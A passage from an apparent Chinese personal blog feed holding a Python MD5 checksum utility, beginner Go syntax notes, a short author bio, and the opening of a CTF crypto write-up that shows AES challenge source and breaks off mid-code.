file_path <span class="hljs-keyword">in</span> file_list&#125;<span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span>, expected_md5: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    验证文件MD5值</span><span class="hljs-string">    :param file_path: 文件路径</span><span class="hljs-string">    :param expected_md5: 预期MD5值</span><span class="hljs-string">    :return: 是否匹配</span><span class="hljs-string">    &quot;&quot;&quot;</span>    actual_md5 = calculate_md5(file_path)    <span class="hljs-keyword">if</span> actual_md5 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    is_match = actual_md5.lower() == expected_md5.lower()    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;文件: <span class="hljs-subst">&#123;os.path.abspath(file_path)&#125;</span>&quot;</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;预期MD5: <span class="hljs-subst">&#123;expected_md5.lower()&#125;</span>&quot;</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;实际MD5: <span class="hljs-subst">&#123;actual_md5.lower()&#125;</span>&quot;</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;验证结果: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;匹配&#x27;</span> <span class="hljs-keyword">if</span> is_match <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;不匹配&#x27;</span>&#125;</span>&quot;</span>)    <span class="hljs-keyword">return</span> is_match<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5_file</span>(<span class="hljs-params">directory: <span class="hljs-built_in">str</span>, output_file: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bool</span>:    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    生成目录的MD5校验文件</span><span class="hljs-string">    :param directory: 目录路径</span><span class="hljs-string">    :param output_file: 输出文件路径(默认: 目录名.md5)</span><span class="hljs-string">    :return: 是否成功</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(directory):        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 目录不存在 - <span class="hljs-subst">&#123;directory&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> output_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        output_file = os.path.basename(directory.rstrip(<span class="hljs-string">&#x27;/\\&#x27;</span>)) + MD5_FILE_EXTENSION    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f_out:            <span class="hljs-keyword">for</span> root, _, files <span class="hljs-keyword">in</span> os.walk(directory):                <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> files:                    file_path = os.path.join(root, filename)                    md5 = calculate_md5(file_path)                    <span class="hljs-keyword">if</span> md5:                        relative_path = os.path.relpath(file_path, directory)                        f_out.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;md5&#125;</span> *<span class="hljs-subst">&#123;relative_path&#125;</span>\n&quot;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功生成校验文件: <span class="hljs-subst">&#123;os.path.abspath(output_file)&#125;</span>&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 无法写入校验文件 - <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5_file</span>(<span class="hljs-params">md5_file: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    验证MD5校验文件中的所有条目</span><span class="hljs-string">    :param md5_file: 校验文件路径</span><span class="hljs-string">    :return: 是否全部验证通过</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(md5_file):        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 校验文件不存在 - <span class="hljs-subst">&#123;md5_file&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    all_passed = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(md5_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:            <span class="hljs-keyword">for</span> line_num, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f, <span class="hljs-number">1</span>):                line = line.strip()                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line <span class="hljs-keyword">or</span> line.startswith(<span class="hljs-string">&#x27;#&#x27;</span>):                    <span class="hljs-keyword">continue</span>                <span class="hljs-comment"># 解析格式: MD5 *文件名 或 MD5 文件名</span>                parts = line.split(maxsplit=<span class="hljs-number">1</span>)                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">2</span>:                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;警告: 第<span class="hljs-subst">&#123;line_num&#125;</span>行格式错误 - <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>, file=sys.stderr)                    all_passed = <span class="hljs-literal">False</span>                    <span class="hljs-keyword">continue</span>                expected_md5, file_path = parts                <span class="hljs-keyword">if</span> file_path.startswith(<span class="hljs-string">&#x27;*&#x27;</span>):                    file_path = file_path[<span class="hljs-number">1</span>:]                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> verify_md5(file_path, expected_md5):                    all_passed = <span class="hljs-literal">False</span>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 读取校验文件失败 - <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">return</span> all_passed<span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_argparse</span>() -&gt; argparse.ArgumentParser:    <span class="hljs-string">&quot;&quot;&quot;配置命令行参数解析&quot;&quot;&quot;</span>    parser = argparse.ArgumentParser(        description=<span class="hljs-string">&#x27;MD5校验工具&#x27;</span>,        formatter_class=argparse.RawDescriptionHelpFormatter,        epilog=<span class="hljs-string">&quot;&quot;&quot;使用示例:</span><span class="hljs-string">  计算MD5:  %(prog)s calc file.txt</span><span class="hljs-string">  验证文件: %(prog)s verify file.txt d41d8cd98f00b204e9800998ecf8427e</span><span class="hljs-string">  生成校验: %(prog)s gen ./directory</span><span class="hljs-string">  验证校验: %(prog)s check checksums.md5&quot;&quot;&quot;</span>    )    subparsers = parser.add_subparsers(dest=<span class="hljs-string">&#x27;command&#x27;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;子命令&#x27;</span>)    <span class="hljs-comment"># calc 子命令</span>    calc_parser = subparsers.add_parser(<span class="hljs-string">&#x27;calc&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;计算文件MD5值&#x27;</span>)    calc_parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;目标文件路径&#x27;</span>)    <span class="hljs-comment"># verify 子命令</span>    verify_parser = subparsers.add_parser(<span class="hljs-string">&#x27;verify&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;验证文件MD5值&#x27;</span>)    verify_parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;要验证的文件路径&#x27;</span>)    verify_parser.add_argument(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;预期的MD5值&#x27;</span>)    <span class="hljs-comment"># gen 子命令</span>    gen_parser = subparsers.add_parser(<span class="hljs-string">&#x27;gen&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;生成目录的MD5校验文件&#x27;</span>)    gen_parser.add_argument(<span class="hljs-string">&#x27;directory&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;目标目录路径&#x27;</span>)    gen_parser.add_argument(<span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-string">&#x27;--output&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输出文件路径&#x27;</span>)    <span class="hljs-comment"># check 子命令</span>    check_parser = subparsers.add_parser(<span class="hljs-string">&#x27;check&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;验证MD5校验文件&#x27;</span>)    check_parser.add_argument(<span class="hljs-string">&#x27;md5_file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;MD5校验文件路径&#x27;</span>)    <span class="hljs-keyword">return</span> parser<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():    parser = setup_argparse()    args = parser.parse_args()    <span class="hljs-keyword">if</span> args.command == <span class="hljs-string">&#x27;calc&#x27;</span>:        md5 = calculate_md5(args.file)        <span class="hljs-keyword">if</span> md5:            <span class="hljs-built_in">print</span>(md5)        <span class="hljs-keyword">else</span>:            sys.exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">elif</span> args.command == <span class="hljs-string">&#x27;verify&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> verify_md5(args.file, args.md5):            sys.exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">elif</span> args.command == <span class="hljs-string">&#x27;gen&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> generate_md5_file(args.directory, args.output):            sys.exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">elif</span> args.command == <span class="hljs-string">&#x27;check&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> verify_md5_file(args.md5_file):            sys.exit(<span class="hljs-number">1</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre></div><p>参考文章：</p><ol><li><a href="https://www.cnblogs.com/lfri/p/12257706.html">MD5校验码有什么作用</a></li><li><a href="https://www.cnblogs.com/lfri/p/12257706.html">MD5校验 </a></li><li><a href="https://blog.csdn.net/weixin_66196770/article/details/140391190">为什么文件需要校验MD5</a></li><li><a href="https://www.sysceo.com/Article-article_info-id-1932.html">如何使用MD5进行文件验证</a></li><li><a href="https://blog.csdn.net/lgj123xj/article/details/134725144">使用MD5当做文件的唯一标识，这样安全么？</a></li></ol><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go基础语法学习笔记</title>
    <link href="/2025/07/11/Go%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/07/11/Go%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>Tips:</strong> 新手向文章，其中涉及的代码你可以在 <em><a href="Https://github.com/fishcanf1y/Programming=Learning/Golang/">Https://github.com/fishcanf1y/Programming=Learning/Golang/</a></em> 中找到</p><h1>Hello World：</h1><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">package</span> main  <span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;      fmt.Printf(<span class="hljs-string">&quot;Hello World\n&quot;</span>)      <span class="hljs-comment">// go run hello.go</span>&#125;</code></pre></div><p>在第一行代码中 <code>package main</code> 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：<code>package main</code>。 <code>package main</code>表示一个可独立执行的程序，每个 <code>Go</code> 应用程序都包含一个名为 <code>main</code> 的包。</p><p>下一行 <code>import &quot;fmt&quot;</code> 告诉 Go 编译器这个程序需要使用 <code>fmt</code> 包（的函数，或其他元素），<code>fmt</code> 包实现了格式化 <code>IO(输入/输出)</code>的函数。</p><p>下一行 <code>func main()</code> 是程序开始执行的函数。<code>main</code> 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 <code>init()</code> 函数则会先执行该函数）。</p><p>下一行 <code>fmt.Println(...)</code> 可以将字符串输出到控制台，并在最后自动增加换行字符 <code>\n</code>。<br>使用 <code>fmt.Print(&quot;hello, world\n&quot;)</code> 可以得到相同的结果。<br><code>Print</code> 和 <code>Println</code> 这两个函数也支持使用变量，如：<code>fmt.Println(arr)</code>。如果没有特别指定，它们会以默认的打印格式将变量 <code>arr</code> 输出到控制台。</p><p>当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ）。</p><p><em>Attention:<code>&#123;</code>不能单独放在一行，所以以下代码在运行时会产生错误：</em></p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;  <span class="hljs-comment">// 错误，&#123; 不能在单独的行上</span>    fmt.Println(<span class="hljs-string">&quot;Hello, World!&quot;</span>)&#125;</code></pre></div><h2 id="关于包：">关于包：</h2><p>关于包，在本地测试得到以下几点</p><ul><li>文件名与包名没有直接关系，不一定要将文件名与包名定成同一个。</li><li>同一个文件夹下的文件只能有一个包名，否则编译报错。</li></ul><h3 id="测试：">测试：</h3><p><strong>文件结构：</strong></p><div class="code-wrapper"><pre><code class="hljs Golang">Test--helloworld.<span class="hljs-keyword">go</span>myMath--myMath1.<span class="hljs-keyword">go</span>--myMath2.<span class="hljs-keyword">go</span></code></pre></div><p><strong>测试代码：</strong></p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-comment">// helloworld.go</span><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;./myMath&quot;</span><span class="hljs-string">&quot;fmt&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;Hello World!&quot;</span>)fmt.Println(mathClass.Add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))fmt.Println(mathClass.Sub(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-comment">// myMath1.go</span><span class="hljs-keyword">package</span> mathClass<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Add</span><span class="hljs-params">(x <span class="hljs-type">int</span>, y <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<span class="hljs-keyword">return</span> x + y&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-comment">// myMath2.go</span><span class="hljs-keyword">package</span> mathClass<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sub</span><span class="hljs-params">(x <span class="hljs-type">int</span>, y <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<span class="hljs-keyword">return</span> x - y&#125;</code></pre></div><h1>Go标记</h1><p>Go程序可以由多个标记组成，可以是关键字、标识符、常量、字符串和符号等。如以下程序由6个标记组成：</p><div class="code-wrapper"><pre><code class="hljs Golang">fmt.Printf(<span class="hljs-string">&quot;Hello World!&quot;</span>)</code></pre></div><p>6个标记分别是这些</p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-number">1.</span> .fmt<span class="hljs-number">2.</span> .<span class="hljs-number">3.</span> Printf<span class="hljs-number">4.</span> (<span class="hljs-number">5.</span> <span class="hljs-string">&quot;Hello World!&quot;</span><span class="hljs-number">6.</span> )</code></pre></div><h1>行分隔符</h1><p>在Go程序中，一行代表一个语句结束，每一个语句不需要像C家族的语言中添加分号，如果打算将多个语句写在同一行，它们则必须使用 <code>;</code> 以人为区分，实际开发中并不鼓励这种做法。</p><p><em>This is am example:</em></p><div class="code-wrapper"><pre><code class="hljs Golang">fmt.Println(<span class="hljs-string">&quot;Hello, World!&quot;</span>)fmt.Println(<span class="hljs-string">&quot;Hello, Golang!&quot;</span>)</code></pre></div><h1>注释</h1><p>注释的内容不会被编译，单行注释是最常见的注释形式，你可以在任何地方使用以 <code>//</code> 开头的单行注释。多行注释也叫块注释，均已以 <code>/*</code> 开头，并以 <code>*/</code> 结尾。如：</p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-comment">// 单行注释</span><span class="hljs-comment">/*</span><span class="hljs-comment"> Author by fishcanf1y</span><span class="hljs-comment"> 我是多行注释</span><span class="hljs-comment"> */</span></code></pre></div><h1>标识符</h1><p>标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母(A~Z和a~z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。</p><p>以下是有效的标识符：</p><div class="code-wrapper"><pre><code class="hljs Golang">mahesh   kumar   abc   move_name   a_123myname50   _temp   j   a23b9   retVal</code></pre></div><p>以下是无效的标识符：</p><ul><li>1ab（以数字开头）</li><li>case（Go 语言的关键字）</li><li>a+b（运算符是不允许的）</li></ul><h1>字符串链接</h1><p>Go语言的字符串连接可以通过<code>+</code>来实现：</p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;Hello&quot;</span> + <span class="hljs-string">&quot;Google&quot;</span>)&#125;</code></pre></div><h1>关键字</h1><p>以下列举Go代码中会使用到的25个关键字或保留字：</p><table><thead><tr><th>Keywords</th><th>Description</th></tr></thead><tbody><tr><td>break</td><td>终止最内层的for或switch语句</td></tr><tr><td>default</td><td>switch语句中的默认分支</td></tr><tr><td>func</td><td>定义函数</td></tr><tr><td>interface</td><td>定义接口</td></tr><tr><td>select</td><td>多路复用操作</td></tr><tr><td>case</td><td>switch语句的分支</td></tr><tr><td>defer</td><td>延迟执行</td></tr><tr><td>go</td><td>启动新的goroutine</td></tr><tr><td>map</td><td>映射类型</td></tr><tr><td>struct</td><td>结构体定义</td></tr><tr><td>chan</td><td>通道类型</td></tr><tr><td>else</td><td>if-else语句中的备选分支</td></tr><tr><td>goto</td><td>无条件跳转到标签</td></tr><tr><td>package</td><td>包声明</td></tr><tr><td>switch</td><td>分支控制结构</td></tr><tr><td>const</td><td>常量定义</td></tr><tr><td>fallthrough</td><td>继续执行下一case或default</td></tr><tr><td>if</td><td>条件判断</td></tr><tr><td>range</td><td>迭代操作</td></tr><tr><td>type</td><td>类型定义</td></tr><tr><td>continue</td><td>跳过当前循环，继续下一次循环</td></tr><tr><td>for</td><td>循环控制结构</td></tr><tr><td>import</td><td>包引入</td></tr><tr><td>return</td><td>函数返回</td></tr><tr><td>var</td><td>变量声明</td></tr></tbody></table><p>除以上所介绍的关键字，Go语言还有36个预定义标识符：</p><table><thead><tr><th>Keywords</th><th>Description</th></tr></thead><tbody><tr><td>append</td><td>添加元素到切片</td></tr><tr><td>bool</td><td>布尔类型</td></tr><tr><td>byte</td><td>字节类型</td></tr><tr><td>cap</td><td>获取切片的容量</td></tr><tr><td>close</td><td>关闭通道</td></tr><tr><td>complex</td><td>复数类型</td></tr><tr><td>complex64</td><td>32位复数类型</td></tr><tr><td>complex128</td><td>64位复数类型</td></tr><tr><td>uint16</td><td>无符号16位整数类型</td></tr><tr><td>copy</td><td>拷贝切片或数组</td></tr><tr><td>false</td><td>布尔值，假</td></tr><tr><td>float32</td><td>单精度浮点数类型</td></tr><tr><td>float64</td><td>双精度浮点数类型</td></tr><tr><td>imag</td><td>获取复数的虚部</td></tr><tr><td>int</td><td>整型</td></tr><tr><td>int8</td><td>8位有符号整数类型</td></tr><tr><td>int16</td><td>16位有符号整数类型</td></tr><tr><td>uint32</td><td>无符号32位整数类型</td></tr><tr><td>int32</td><td>32位有符号整数类型</td></tr><tr><td>int64</td><td>64位有符号整数类型</td></tr><tr><td>iota</td><td>常量生成器</td></tr><tr><td>len</td><td>获取切片或字符串的长度</td></tr><tr><td>make</td><td>创建并初始化类型</td></tr><tr><td>new</td><td>分配零值内存</td></tr><tr><td>nil</td><td>空值</td></tr><tr><td>panic</td><td>引发运行时错误</td></tr><tr><td>uint64</td><td>无符号64位整数类型</td></tr><tr><td>print</td><td>打印输出</td></tr><tr><td>println</td><td>打印并换行</td></tr><tr><td>real</td><td>获取复数的实部</td></tr><tr><td>recover</td><td>恢复panic引起的错误</td></tr><tr><td>string</td><td>字符串类型</td></tr><tr><td>true</td><td>布尔值，真</td></tr><tr><td>uint</td><td>无符号整数类型</td></tr><tr><td>uint8</td><td>无符号8位整数类型</td></tr><tr><td>uintptr</td><td>无符号指针类型</td></tr></tbody></table><h1>Go语言中的空格</h1><p>在 Go 语言中，空格通常用于分隔标识符、关键字、运算符和表达式，以提高代码的可读性。<br>Go 语言中变量的声明必须使用空格隔开，如：</p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">var</span> x <span class="hljs-type">int</span><span class="hljs-keyword">const</span> Pi <span class="hljs-type">float64</span> = <span class="hljs-number">3.14159265358979323846</span></code></pre></div><p>在运算符和操作数之间要使用空格能让程序更易阅读</p><p>无空格：</p><div class="code-wrapper"><pre><code class="hljs Golang">fruit=apples+oranges;</code></pre></div><p>在关键字和表达式之间要使用空格。</p><p>例如：</p><div class="code-wrapper"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> &#123;    <span class="hljs-comment">// do something</span>&#125;</code></pre></div><p>在函数调用时，函数名和左边等号之间要使用空格，参数之间也要使用空格。</p><p>例如：</p><div class="code-wrapper"><pre><code class="hljs Golang">result := add(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)</code></pre></div><h1>格式化字符串</h1><p>Go 语言中使用 <code>fmt.Sprintf</code> 或 <code>fmt.Printf</code> 格式化字符串并赋值给新串：</p><p><code>Sprintf</code> 根据格式化参数生成格式化的字符串并返回该字符串。<br><code>Printf</code> 根据格式化参数生成格式化的字符串并写入标准输出。</p><p><em>Sprintf示例：</em></p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">&quot;fmt&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;   <span class="hljs-comment">// %d 表示整型数字，%s 表示字符串</span>    <span class="hljs-keyword">var</span> stockcode=<span class="hljs-number">123</span>    <span class="hljs-keyword">var</span> enddate=<span class="hljs-string">&quot;2025-07-11&quot;</span>    <span class="hljs-keyword">var</span> url=<span class="hljs-string">&quot;Code=%d&amp;endDate=%s&quot;</span>    <span class="hljs-keyword">var</span> target_url=fmt.Sprintf(url,stockcode,enddate)    fmt.Println(target_url)&#125;</code></pre></div><p>输出结果为：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Code</span>=<span class="hljs-number">123</span>&amp;endDate=<span class="hljs-number">2025</span>-<span class="hljs-number">07</span>-<span class="hljs-number">11</span></code></pre></div><p><em>Printf示例：</em></p><div class="code-wrapper"><pre><code class="hljs Golang"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;fmt&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> stockcode = <span class="hljs-number">123</span><span class="hljs-keyword">var</span> enddate = <span class="hljs-string">&quot;2025-07-11&quot;</span><span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;Code=%d&amp;endDate=%s&quot;</span>fmt.Printf(url, stockcode, enddate)&#125;</code></pre></div><p>输出结果为：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Code</span>=<span class="hljs-number">123</span>&amp;endDate=<span class="hljs-number">2025</span>-<span class="hljs-number">07</span>-<span class="hljs-number">11</span></code></pre></div><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Things You May Want to Know</title>
    <link href="/2025/07/10/About-20250210/"/>
    <url>/2025/07/10/About-20250210/</url>
    
    <content type="html"><![CDATA[<h3 id="About-Me">About Me:</h3><p>Hi~ 我的名字是ZhenngHailin，目前是一位在读高中生，网络安全爱好者</p><p>以前是一名Web手，同时还涉猎简单的Misc，我对<code>Pwnable</code> / <code>Reverse</code>很感兴趣，欢迎和我交流</p><p>我的博客主要用于记录一些CTF赛题、技术研究和Coding(个人感觉大部分都是些很基础的东西)，同时也会放一些个人感想 希望它能够帮到你</p><p>我的邮箱是：<em><a href="mailto:iszhenghailin@gmail.com">iszhenghailin@gmail.com</a></em> 欢迎和我联系！</p><p>（可以交换友链，麻烦联系我的邮箱 Thx~）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界Crypto-了不起的盖茨比</title>
    <link href="/2025/07/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84%E7%9B%96%E8%8C%A8%E6%AF%94/"/>
    <url>/2025/07/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84%E7%9B%96%E8%8C%A8%E6%AF%94/</url>
    
    <content type="html"><![CDATA[<h3 id="Description">Description:</h3><p>小王读了盖茨比深受震撼，于是摘录本书并效仿原作者为你加密留了一段言，但他忘记给你iv了，请问你可以恢复出来原文吗<br>(得到的flag内容用CatCTF{}包上提交)</p><p>附件内容为python源代码程序，对其进行分析：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES  <span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor  <span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad  <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *  <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *  <span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy  <span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data    iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])   iva=copy(iv)  key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])  cipher=AES.new(key,mode=AES.MODE_ECB)  data=pad(data,<span class="hljs-number">16</span>)  c=<span class="hljs-string">b&quot;&quot;</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span 